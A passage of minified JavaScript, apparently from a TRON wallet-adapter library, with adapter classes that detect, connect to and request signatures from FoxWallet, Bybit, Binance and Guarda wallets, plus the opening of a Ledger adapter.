                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return _n(this, void 0, void 0, function*() {
                        this.state === c.Connected && (this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"))
                    })
                }
                signTransaction(t, e) {
                    return _n(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.sign(t, e)
                            } catch (t) {
                                throw t instanceof Error ? new v(t.message,t) : new v(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                multiSign(t, e, n) {
                    return _n(this, void 0, void 0, function*() {
                        try {
                            const r = yield this.checkAndGetWallet();
                            try {
                                return yield r.tronWeb.trx.multiSign(t, e, n)
                            } catch (t) {
                                throw t instanceof Error ? new v(t.message,t) : new v(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t, e) {
                    return _n(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.signMessageV2(t, e)
                            } catch (t) {
                                throw t instanceof Error ? new y(t.message,t) : new y(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                checkAndGetWallet() {
                    return _n(this, void 0, void 0, function*() {
                        if (this.checkIfOpenApp(),
                        yield this._checkWallet(),
                        !this.connected)
                            throw new g;
                        const t = this._wallet;
                        if (!t || !t.tronWeb)
                            throw new g;
                        return t
                    })
                }
                checkForWalletReady() {
                    if (this.checkReadyInterval)
                        return;
                    let t = 0;
                    const e = Math.floor(this.config.checkTimeout / 200);
                    this.checkReadyInterval = setInterval( () => _n(this, void 0, void 0, function*() {
                        var n, r, i;
                        (null === (i = null === (r = null === (n = this._wallet) || void 0 === n ? void 0 : n.tronWeb) || void 0 === r ? void 0 : r.defaultAddress) || void 0 === i ? void 0 : i.base58) ? (this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                        this.checkReadyInterval = null,
                        yield this._updateWallet(),
                        this.emit("connect", this.address || "")) : t > e ? (this.checkReadyInterval && clearInterval(this.checkReadyInterval),
                        this.checkReadyInterval = null) : t++
                    }), 200)
                }
                _checkWallet() {
                    if (this.readyState === a.Found)
                        return Promise.resolve(!0);
                    if (this._checkPromise)
                        return this._checkPromise;
                    const t = Math.floor(this.config.checkTimeout / 100);
                    let e, n = 0;
                    return this._checkPromise = new Promise(r => {
                        const i = () => {
                            n++;
                            const i = bn();
                            (i || n > t) && (e && clearInterval(e),
                            this._readyState = i ? a.Found : a.NotFound,
                            this._updateWallet(),
                            this.emit("readyStateChanged", this.readyState),
                            r(i))
                        }
                        ;
                        e = setInterval(i, 100),
                        i()
                    }
                    ),
                    this._checkPromise
                }
                checkIfOpenApp() {
                    if (!1 !== this.config.openAppWithDeeplink && function() {
                        if (u() && !bn()) {
                            const {origin: t, pathname: e, search: n, hash: r} = window.location
                              , i = t + e + n + r;
                            return location.href = `foxwallet://dapp?url=${encodeURIComponent(i)}`,
                            !0
                        }
                        return !1
                    }())
                        throw new p
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    t !== this.state && (this._state = t,
                    this.emit("stateChanged", t))
                }
            }
            ,
            bybit: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "Bybit Wallet",
                    this.url = "https://bybit.com/web3",
                    this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iODgiIGhlaWdodD0iODgiIHZpZXdCb3g9IjAgMCA4OCA4OCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTAgMTguN0MwIDguMzcyMjcgOC4zNzIyOCAwIDE4LjcgMEg2OS4zQzc5LjYyNzcgMCA4OCA4LjM3MjI4IDg4IDE4LjdWNjkuM0M4OCA3OS42Mjc3IDc5LjYyNzcgODggNjkuMyA4OEgxOC43QzguMzcyMjcgODggMCA3OS42Mjc3IDAgNjkuM1YxOC43WiIgZmlsbD0iIzQwNDM0NyIvPgo8cGF0aCBkPSJNNy41NzYxNyAyNi44MDY3QzYuNzg1MTYgMjQuMDc4NyA4LjQ3NzUgMjEuMjUzMSAxMS4yNTU5IDIwLjY2M0w1Ny42MDg3IDEwLjgxNzNDNTkuODA5IDEwLjM1IDYyLjA0NDMgMTEuNDQ0MyA2My4wMjQ3IDEzLjQ2ODlMODMuODQ0MyA1Ni40NjU3TDI1LjE3NzYgODcuNTEwMUw3LjU3NjE3IDI2LjgwNjdaIiBmaWxsPSJ1cmwoI3BhaW50MF9saW5lYXJfMzEyXzE3NTM0KSIvPgo8cGF0aCBkPSJNOC4xODI0MiAzMC4xNjE4QzcuMzUwNDkgMjcuMjgzOCA5LjI3OTI1IDI0LjM0MTMgMTIuMjUwMiAyMy45NTU5TDczLjY4NjUgMTUuOTg4MUM3Ni4yMzkxIDE1LjY1NzEgNzguNjExMSAxNy4zNjE4IDc5LjExMTEgMTkuODg2N0w4OC4wMDAzIDY0Ljc3NzFMMjQuNjg5MiA4Ny4yNjY1TDguMTgyNDIgMzAuMTYxOFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0wIDM0LjIyMjJDMCAyOC44MjIxIDQuMzc3NjYgMjQuNDQ0NSA5Ljc3Nzc4IDI0LjQ0NDVINjguNDQ0NEM3OS4yNDQ3IDI0LjQ0NDUgODggMzMuMTk5OCA4OCA0NFY2OC40NDQ1Qzg4IDc5LjI0NDcgNzkuMjQ0NyA4OCA2OC40NDQ0IDg4SDE5LjU1NTZDOC43NTUzMiA4OCAwIDc5LjI0NDcgMCA2OC40NDQ1VjM0LjIyMjJaIiBmaWxsPSJibGFjayIvPgo8cGF0aCBkPSJNNTguMjIwMSA2MS4xOTU5VjQyLjg3NTVINjEuNzkzN1Y2MS4xOTU5SDU4LjIyMDFaIiBmaWxsPSIjRjdBNjAwIi8+CjxwYXRoIGQ9Ik0xNy40Mzk1IDY2LjY2MzdIOS43Nzc5NVY0OC4zNDM0SDE3LjEzMTNDMjAuNzA0OSA0OC4zNDM0IDIyLjc4NzQgNTAuMzUwNSAyMi43ODc0IDUzLjQ4OTNDMjIuNzg3NCA1NS41MjE1IDIxLjQ1MDQgNTYuODM0NSAyMC41MjU3IDU3LjI3MjFDMjEuNjMxNSA1Ny43ODY5IDIzLjA0NTYgNTguOTQzOCAyMy4wNDU2IDYxLjM4ODVDMjMuMDQ1NiA2NC44MTA4IDIwLjcwNDkgNjYuNjYzNyAxNy40Mzk1IDY2LjY2MzdaTTE2Ljg0ODEgNTEuNTM0M0gxMy4zNTE2VjU1Ljc1NDhIMTYuODQ4MUMxOC4zNjQyIDU1Ljc1NDggMTkuMjEzOCA1NC45MDY0IDE5LjIxMzggNTMuNjQ1NUMxOS4yMTM4IDUyLjM4MjYgMTguMzY2MiA1MS41MzQzIDE2Ljg0ODEgNTEuNTM0M1pNMTcuMDc5MyA1OC45NzA4SDEzLjM1MTZWNjMuNDcyOEgxNy4wNzkzQzE4LjY5OTQgNjMuNDcyOCAxOS40NyA2Mi40NDMyIDE5LjQ3IDYxLjIwOTJDMTkuNDcyIDU5Ljk3MzMgMTguNjk5NCA1OC45NzA4IDE3LjA3OTMgNTguOTcwOFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik0zMi44OTI1IDU5LjE1MDFWNjYuNjYzN0gyOS4zNDM5VjU5LjE1MDFMMjMuODQxOSA0OC4zNDM0SDI3LjcyMzhMMzEuMTQzMiA1NS43Mjc4TDM0LjUxMDcgNDguMzQzNEgzOC4zOTI2TDMyLjg5MjUgNTkuMTUwMVoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik00OC41NjMzIDY2LjY2MzdINDAuOTAxN1Y0OC4zNDM0SDQ4LjI1NTFDNTEuODI4NyA0OC4zNDM0IDUzLjkxMTIgNTAuMzUwNSA1My45MTEyIDUzLjQ4OTNDNTMuOTExMiA1NS41MjE1IDUyLjU3NDIgNTYuODM0NSA1MS42NDk1IDU3LjI3MjFDNTIuNzU1MyA1Ny43ODY5IDU0LjE2OTMgNTguOTQzOCA1NC4xNjkzIDYxLjM4ODVDNTQuMTY3NCA2NC44MTA4IDUxLjgyNjggNjYuNjYzNyA0OC41NjMzIDY2LjY2MzdaTTQ3Ljk3MTkgNTEuNTM0M0g0NC40NzUzVjU1Ljc1NDhINDcuOTcxOUM0OS40ODggNTUuNzU0OCA1MC4zMzc2IDU0LjkwNjQgNTAuMzM3NiA1My42NDU1QzUwLjMzNTcgNTIuMzgyNiA0OS40ODggNTEuNTM0MyA0Ny45NzE5IDUxLjUzNDNaTTQ4LjIwMzEgNTguOTcwOEg0NC40NzUzVjYzLjQ3MjhINDguMjAzMUM0OS44MjMyIDYzLjQ3MjggNTAuNTkzOCA2Mi40NDMyIDUwLjU5MzggNjEuMjA5MkM1MC41OTM4IDU5Ljk3MzQgNDkuODIxMyA1OC45NzA4IDQ4LjIwMzEgNTguOTcwOFoiIGZpbGw9IndoaXRlIi8+CjxwYXRoIGQ9Ik03My40MzkgNTEuNTM0M1Y2Ni42NjM3SDY5Ljg2NTRWNTEuNTM0M0g2NS4wODM5VjQ4LjM0MzRINzguMjIyNFY1MS41MzQzSDczLjQzOVoiIGZpbGw9IndoaXRlIi8+CjxkZWZzPgo8bGluZWFyR3JhZGllbnQgaWQ9InBhaW50MF9saW5lYXJfMzEyXzE3NTM0IiB4MT0iNy4zMzMwOCIgeTE9IjI1LjU5NCIgeDI9Ijg0LjYzODEiIHkyPSIyMS43MjE2IiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSI+CjxzdG9wIHN0b3AtY29sb3I9IiNGRkQ3NDgiLz4KPHN0b3Agb2Zmc2V0PSIxIiBzdG9wLWNvbG9yPSIjRjdBNjAwIi8+CjwvbGluZWFyR3JhZGllbnQ+CjwvZGVmcz4KPC9zdmc+Cg==",
                    this._readyState = h() ? a.Loading : a.NotFound,
                    this._state = c.Loading,
                    this.messageHandler = t => {
                        var e, n, r;
                        const i = null === (e = t.data) || void 0 === e ? void 0 : e.message;
                        if (i)
                            if ("accountsChanged" === i.action)
                                setTimeout( () => {
                                    var t;
                                    const e = this.address || "";
                                    if (null === (t = this._wallet) || void 0 === t ? void 0 : t.ready) {
                                        const t = i.data.address;
                                        this.setAddress(t),
                                        this.setState(c.Connected)
                                    } else
                                        this.setAddress(null),
                                        this.setState(c.Disconnect);
                                    (this.address || "") !== e && this.emit("accountsChanged", this.address || "", e),
                                    !e && this.address ? this.emit("connect", this.address) : e && !this.address && this.emit("disconnect")
                                }
                                , 200);
                            else if ("connect" === i.action) {
                                const t = this.connected
                                  , e = this.address || ""
                                  , i = (null === (r = null === (n = this._wallet.tronWeb) || void 0 === n ? void 0 : n.defaultAddress) || void 0 === r ? void 0 : r.base58) || "";
                                this.setAddress(i),
                                this.setState(c.Connected),
                                t ? i !== e && this.emit("accountsChanged", this.address || "", e) : this.emit("connect", i)
                            } else
                                "disconnect" === i.action && (this.setAddress(null),
                                this.setState(c.Disconnect),
                                this.emit("disconnect"))
                    }
                    ,
                    this._checkPromise = null,
                    this._updateWallet = () => {
                        var t, e;
                        let n = this.state
                          , r = this.address;
                        Tn() ? (this._wallet = window.bybitWallet.tronLink,
                        this._listenEvent(),
                        r = (null === (e = null === (t = this._wallet.tronWeb) || void 0 === t ? void 0 : t.defaultAddress) || void 0 === e ? void 0 : e.base58) || null,
                        n = this._wallet.ready ? c.Connected : c.Disconnect) : (this._wallet = null,
                        r = null,
                        n = c.NotFound),
                        this.setAddress(r),
                        this.setState(n)
                    }
                    ;
                    const {checkTimeout: e=2e3, openUrlWhenWalletNotFound: n=!0, openAppWithDeeplink: r=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[BybitWalletAdapter] config.checkTimeout should be a number");
                    if (this.config = {
                        checkTimeout: e,
                        openAppWithDeeplink: r,
                        openUrlWhenWalletNotFound: n
                    },
                    this._connecting = !1,
                    this._wallet = null,
                    this._address = null,
                    !h())
                        return this._readyState = a.NotFound,
                        void this.setState(c.NotFound);
                    Tn() ? (this._readyState = a.Found,
                    this._updateWallet()) : this._checkWallet().then( () => {
                        this.connected && this.emit("connect", this.address || "")
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return xn(this, void 0, void 0, function*() {
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            const t = this._wallet;
                            if (!t || !t.tronWeb)
                                throw new g;
                            try {
                                return yield In(t.tronWeb)
                            } catch (t) {
                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return xn(this, void 0, void 0, function*() {
                        var t;
                        try {
                            if (this.checkIfOpenBybitWallet(),
                            this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
                            this.state === c.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            if (!this._wallet)
                                return;
                            this._connecting = !0;
                            const e = this._wallet;
                            try {
                                const t = yield e.request({
                                    method: "tron_requestAccounts"
                                });
                                if (!t)
                                    throw new w("Request connect error.");
                                if (4e3 === t.code)
                                    throw new w("The same DApp has already initiated a request to connect to BybitWallet, and the pop-up window has not been closed.");
                                if (4001 === t.code)
                                    throw new w("The user rejected connection.")
                            } catch (t) {
                                throw new w(null == t ? void 0 : t.message,t)
                            }
                            const n = (null === (t = e.tronWeb.defaultAddress) || void 0 === t ? void 0 : t.base58) || "";
                            this.setAddress(n),
                            this.setState(c.Connected),
                            this._listenEvent(),
                            this.connected && this.emit("connect", this.address || "")
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return xn(this, void 0, void 0, function*() {
                        this._stopListenEvent(),
                        this.state === c.Connected && (this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"))
                    })
                }
                signTransaction(t, e) {
                    return xn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.sign(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                multiSign(t, e, n) {
                    return xn(this, void 0, void 0, function*() {
                        try {
                            const r = yield this.checkAndGetWallet();
                            try {
                                return yield r.tronWeb.trx.multiSign(t, e, n)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new v(t.message,t) : "string" == typeof t ? new v(t,new Error(t)) : new v("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t, e) {
                    return xn(this, void 0, void 0, function*() {
                        try {
                            const n = yield this.checkAndGetWallet();
                            try {
                                return yield n.tronWeb.trx.signMessageV2(t, e)
                            } catch (t) {
                                throw t instanceof Error || "object" == typeof t && t.message ? new y(t.message,t) : "string" == typeof t ? new y(t,new Error(t)) : new y("Unknown error",t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                checkAndGetWallet() {
                    return xn(this, void 0, void 0, function*() {
                        if (this.checkIfOpenBybitWallet(),
                        yield this._checkWallet(),
                        this.state !== c.Connected)
                            throw new g;
                        const t = this._wallet;
                        if (!t || !t.tronWeb)
                            throw new g;
                        return t
                    })
                }
                _listenEvent() {
                    this._stopListenEvent(),
                    window.addEventListener("message", this.messageHandler)
                }
                _stopListenEvent() {
                    window.removeEventListener("message", this.messageHandler)
                }
                checkIfOpenBybitWallet() {
                    if (!1 !== this.config.openAppWithDeeplink && !("undefined" != typeof window && void 0 !== window.navigator && /bybit_app/i.test(window.navigator.userAgent) || !u() || (window.location.href = `https://app.bybit.com/inapp?by_dp=${encodeURIComponent("bybitapp://open/route?targetUrl=by%3A%2F%2Fweb3%2Ftab%2Findex%3Findex%3D0")}&by_web_link=${encodeURIComponent(window.location.href)}`,
                    0)))
                        throw new p
                }
                _checkWallet() {
                    if (this.readyState === a.Found)
                        return Promise.resolve(!0);
                    if (this._checkPromise)
                        return this._checkPromise;
                    const t = Math.floor(this.config.checkTimeout / 100);
                    let e, n = 0;
                    return this._checkPromise = new Promise(r => {
                        const i = () => {
                            n++;
                            const i = Tn();
                            (i || n > t) && (e && clearInterval(e),
                            this._readyState = i ? a.Found : a.NotFound,
                            this._updateWallet(),
                            this.emit("readyStateChanged", this.readyState),
                            r(i))
                        }
                        ;
                        e = setInterval(i, 100),
                        i()
                    }
                    ),
                    this._checkPromise
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    t !== this.state && (this._state = t,
                    this.emit("stateChanged", t))
                }
            }
            ,
            binance: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "Binance Wallet",
                    this.url = "https://www.binance.com/en/binancewallet",
                    this.icon = "data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAiIGhlaWdodD0iMzAiIHZpZXdCb3g9IjAgMCAzMCAzMCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjMwIiBoZWlnaHQ9IjMwIiBmaWxsPSIjMEIwRTExIi8+CjxwYXRoIGQ9Ik01IDE1TDcuMjU4MDYgMTIuNzQxOUw5LjUxNjEzIDE1TDcuMjU4MDYgMTcuMjU4MUw1IDE1WiIgZmlsbD0iI0YwQjkwQiIvPgo8cGF0aCBkPSJNOC44NzA5NyAxMS4xMjlMMTUgNUwyMS4xMjkgMTEuMTI5TDE4Ljg3MSAxMy4zODcxTDE1IDkuNTE2MTNMMTEuMTI5IDEzLjM4NzFMOC44NzA5NyAxMS4xMjlaIiBmaWxsPSIjRjBCOTBCIi8+CjxwYXRoIGQ9Ik0xMi43NDE5IDE1TDE1IDEyLjc0MTlMMTcuMjU4MSAxNUwxNSAxNy4yNTgxTDEyLjc0MTkgMTVaIiBmaWxsPSIjRjBCOTBCIi8+CjxwYXRoIGQ9Ik0xMS4xMjkgMTYuNjEyOUw4Ljg3MDk3IDE4Ljg3MUwxNSAyNUwyMS4xMjkgMTguODcxTDE4Ljg3MSAxNi42MTI5TDE1IDIwLjQ4MzlMMTEuMTI5IDE2LjYxMjlaIiBmaWxsPSIjRjBCOTBCIi8+CjxwYXRoIGQ9Ik0yMC40ODM5IDE1TDIyLjc0MTkgMTIuNzQxOUwyNSAxNUwyMi43NDE5IDE3LjI1ODFMMjAuNDgzOSAxNVoiIGZpbGw9IiNGMEI5MEIiLz4KPC9zdmc+Cg==",
                    this._readyState = h() ? a.Loading : a.NotFound,
                    this._state = c.Loading,
                    this._onAccountsChanged = t => {
                        const e = this.address || "";
                        this.setAddress(t[0]),
                        this.emit("accountsChanged", this.address || "", e)
                    }
                    ,
                    this._checkPromise = null,
                    this._updateProvider = () => {
                        var t;
                        let e = this.state
                          , n = this.address;
                        (null === (t = window.binancew3w) || void 0 === t ? void 0 : t.tron) ? (this._provider = window.binancew3w.tron,
                        n = null,
                        e = c.Disconnect) : (this._provider = null,
                        n = null,
                        e = c.NotFound),
                        this.setAddress(n),
                        this.setState(e)
                    }
                    ;
                    const {checkTimeout: e=2e3, openUrlWhenWalletNotFound: n=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[BinanceWalletAdapter] config.checkTimeout should be a number");
                    if (this.config = {
                        checkTimeout: e,
                        openUrlWhenWalletNotFound: n
                    },
                    this._connecting = !1,
                    this._provider = null,
                    this._address = null,
                    !h())
                        return this._readyState = a.NotFound,
                        void this.setState(c.NotFound);
                    this._checkWallet().then( () => {
                        this.connected && (this.emit("connect", this.address || ""),
                        this._listenEvent())
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return wn(this, void 0, void 0, function*() {
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            try {
                                const t = this._provider.getChainId();
                                return {
                                    networkType: mn[t] || un.Unknown,
                                    chainId: t,
                                    fullNode: "",
                                    solidityNode: "",
                                    eventServer: ""
                                }
                            } catch (t) {
                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return wn(this, void 0, void 0, function*() {
                        try {
                            if (this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
                            this.state === c.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            this._connecting = !0;
                            try {
                                const {address: t} = yield this._provider.getAccount();
                                this.setAddress(t),
                                this.setState(c.Connected),
                                this.emit("connect", t),
                                this._listenEvent()
                            } catch (t) {
                                throw new w(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return wn(this, void 0, void 0, function*() {
                        this.state === c.Connected && (yield this._provider.disconnect(),
                        this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"),
                        this._stopListenEvent())
                    })
                }
                signMessage(t) {
                    return wn(this, void 0, void 0, function*() {
                        try {
                            if (this.state !== c.Connected)
                                throw new g;
                            try {
                                return yield this._provider.signMessageV2(t)
                            } catch (t) {
                                throw new y(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signTransaction(t) {
                    return wn(this, void 0, void 0, function*() {
                        try {
                            if (this.state !== c.Connected)
                                throw new g;
                            try {
                                return yield this._provider.signTransaction(t)
                            } catch (t) {
                                throw new v(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                _listenEvent() {
                    this._stopListenEvent(),
                    this._provider.on("accountsChanged", this._onAccountsChanged)
                }
                _stopListenEvent() {
                    this._provider.removeListener("accountsChanged", this._onAccountsChanged)
                }
                _checkWallet() {
                    return wn(this, void 0, void 0, function*() {
                        if (this.readyState === a.Found)
                            return !0;
                        if (this._checkPromise)
                            return this._checkPromise;
                        const t = Math.floor(this.config.checkTimeout / 100);
                        let e, n = 0;
                        return this._checkPromise = new Promise(r => {
                            const i = () => {
                                var i;
                                n++;
                                const o = !!(null === (i = window.binancew3w) || void 0 === i ? void 0 : i.tron);
                                (o || n > t) && (e && clearInterval(e),
                                this._readyState = o ? a.Found : a.NotFound,
                                this._updateProvider(),
                                this.emit("readyStateChanged", this.readyState),
                                r(o))
                            }
                            ;
                            e = setInterval(i, 100),
                            i()
                        }
                        ),
                        this._checkPromise
                    })
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    t !== this.state && (this._state = t,
                    this.emit("stateChanged", t))
                }
            }
            ,
            guarda: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "Guarda",
                    this.url = "https://guarda.com?install=guarda-extensional",
                    this.icon = 'data:image/svg+xml;utf8,<svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M42.988 4.81415C43.0306 4.86441 43.0563 4.92697 43.0613 4.99278C43.0877 5.31552 45.4233 37.3313 23.6002 44.7878C23.5347 44.8103 23.4636 44.8103 23.398 44.7878C1.57567 37.3313 3.91123 5.31552 3.93695 4.99278C3.9422 4.92717 3.96786 4.86486 4.01029 4.81465C4.05273 4.76445 4.10979 4.72891 4.17343 4.71304L23.4251 0.00861373C23.4738 -0.00287124 23.5244 -0.00287124 23.573 0.00861373L42.8241 4.71304C42.888 4.72848 42.9454 4.7639 42.988 4.81415ZM39.4448 8.23253C39.4795 8.27324 39.5006 8.32385 39.5051 8.37725H39.5073C39.5287 8.64049 41.4392 34.7784 23.582 40.865C23.5296 40.885 23.4716 40.885 23.4192 40.865C5.56132 34.7784 7.47248 8.64049 7.49393 8.37725C7.49807 8.32385 7.51897 8.27309 7.55364 8.23238C7.5883 8.19168 7.63494 8.16303 7.68682 8.15057L23.4377 4.30758C23.4776 4.29755 23.5193 4.29755 23.5592 4.30758L39.3115 8.15057C39.3634 8.16318 39.41 8.19188 39.4448 8.23253Z" fill="%23798CE5"/><path d="M23.2759 10.0442L12.7734 12.6047C12.7388 12.6136 12.7078 12.6331 12.6847 12.6604C12.6617 12.6878 12.6477 12.7218 12.6448 12.7575C12.6312 12.9332 11.3574 30.3588 23.2609 34.417C23.2966 34.4284 23.3352 34.4284 23.3709 34.417C35.2745 30.3581 34.0014 12.9332 33.987 12.7568C33.9843 12.721 33.9704 12.6869 33.9471 12.6595C33.9239 12.6322 33.8926 12.613 33.8577 12.6047L23.3559 10.0435C23.3297 10.0365 23.3022 10.0365 23.2759 10.0435" fill="%23798CE5"/></svg>',
                    this._readyState = h() ? a.Loading : a.NotFound,
                    this._state = c.Loading,
                    this._checkPromise = null,
                    this._updateWallet = () => {
                        if (!h())
                            return;
                        const t = window.guarda;
                        zn() && t ? (this._wallet = t,
                        this.setState(c.Disconnect)) : (this._wallet = null,
                        this.setState(c.NotFound))
                    }
                    ;
                    const {checkTimeout: e=2e3, openUrlWhenWalletNotFound: n=!0} = t;
                    if ("number" != typeof e)
                        throw new Error("[GuardaAdapter] config.checkTimeout should be a number");
                    this.config = {
                        checkTimeout: e,
                        openUrlWhenWalletNotFound: n
                    },
                    this._connecting = !1,
                    this._wallet = null,
                    this._address = null,
                    zn() ? (this._readyState = a.Found,
                    this._updateWallet()) : this._checkWallet().then( () => {
                        this.connected && this.emit("connect", this.address || "")
                    }
                    )
                }
                get address() {
                    return this._address
                }
                get state() {
                    return this._state
                }
                get readyState() {
                    return this._readyState
                }
                get connecting() {
                    return this._connecting
                }
                network() {
                    return Rn(this, void 0, void 0, function*() {
                        try {
                            if (yield this._checkWallet(),
                            this.state !== c.Connected)
                                throw new g;
                            const t = this._wallet;
                            if (!t || !t.tronWeb)
                                throw new g;
                            try {
                                return yield In(t.tronWeb)
                            } catch (t) {
                                throw new N(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                connect() {
                    return Rn(this, void 0, void 0, function*() {
                        try {
                            if (this.connected || this.connecting)
                                return;
                            if (yield this._checkWallet(),
                            this.readyState === a.NotFound)
                                throw !1 !== this.config.openUrlWhenWalletNotFound && h() && window.open(this.url, "_blank"),
                                new p;
                            if (!this._wallet)
                                return;
                            this._connecting = !0;
                            const t = this._wallet;
                            try {
                                const e = yield t.tron.request({
                                    method: "eth_requestAccounts"
                                });
                                if (!(null == e ? void 0 : e[0]))
                                    throw new w("Request connect error.");
                                const n = e[0];
                                this.setAddress(n),
                                this.setState(c.Connected),
                                this.emit("connect", this.address || "")
                            } catch (t) {
                                throw t instanceof f ? t : new w(null == t ? void 0 : t.message,t)
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        } finally {
                            this._connecting = !1
                        }
                    })
                }
                disconnect() {
                    return Rn(this, void 0, void 0, function*() {
                        this.state === c.Connected && (this.setAddress(null),
                        this.setState(c.Disconnect),
                        this.emit("disconnect"))
                    })
                }
                signTransaction(t) {
                    return Rn(this, void 0, void 0, function*() {
                        try {
                            const e = yield this.checkAndGetWallet();
                            try {
                                return yield e.tronWeb.trx.sign(t)
                            } catch (t) {
                                throw t instanceof Error ? new v(t.message,t) : new v(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                signMessage(t) {
                    return Rn(this, void 0, void 0, function*() {
                        try {
                            const e = yield this.checkAndGetWallet();
                            try {
                                return yield e.tronWeb.trx.signMessage(t)
                            } catch (t) {
                                throw t instanceof Error ? new y(t.message,t) : new y(t,new Error(t))
                            }
                        } catch (t) {
                            throw this.emit("error", t),
                            t
                        }
                    })
                }
                checkAndGetWallet() {
                    return Rn(this, void 0, void 0, function*() {
                        if (yield this._checkWallet(),
                        this.state !== c.Connected)
                            throw new g;
                        const t = this._wallet;
                        if (!t || !t.tronWeb)
                            throw new g;
                        return t
                    })
                }
                _checkWallet() {
                    if (this.readyState === a.Found)
                        return Promise.resolve(!0);
                    if (this._checkPromise)
                        return this._checkPromise;
                    const t = Math.floor(this.config.checkTimeout / 100);
                    let e, n = 0;
                    return this._checkPromise = new Promise(r => {
                        const i = () => {
                            n++;
                            const i = zn();
                            (i || n > t) && (e && clearInterval(e),
                            this._readyState = i ? a.Found : a.NotFound,
                            this._updateWallet(),
                            this.emit("readyStateChanged", this.readyState),
                            r(i))
                        }
                        ;
                        e = setInterval(i, 100),
                        i()
                    }
                    ),
                    this._checkPromise
                }
                setAddress(t) {
                    this._address = t
                }
                setState(t) {
                    this._state = t,
                    this.emit("stateChanged", t)
                }
            }
            ,
            ledger: new class extends d {
                constructor(t={}) {
                    super(),
                    this.name = "Ledger",
                    this.url = "https://www.ledger.com/",
